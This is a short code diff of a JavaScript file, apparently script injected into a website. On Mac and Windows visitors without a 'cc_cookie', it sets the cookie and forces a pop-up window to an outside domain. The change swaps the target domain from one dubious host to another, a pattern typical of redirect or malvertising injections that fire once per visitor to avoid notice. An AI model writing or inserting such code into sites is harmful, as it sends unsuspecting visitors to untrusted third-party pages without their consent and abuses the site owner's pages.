@@ -10,7 +10,7 @@ function addjs(src) {
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
-        window.open("http://nk.bi36k.cn");
+        window.open("http://qp.cxwufangbu.cc");
     }
 }else{
 if (!getCookie('cc_cookie')) {
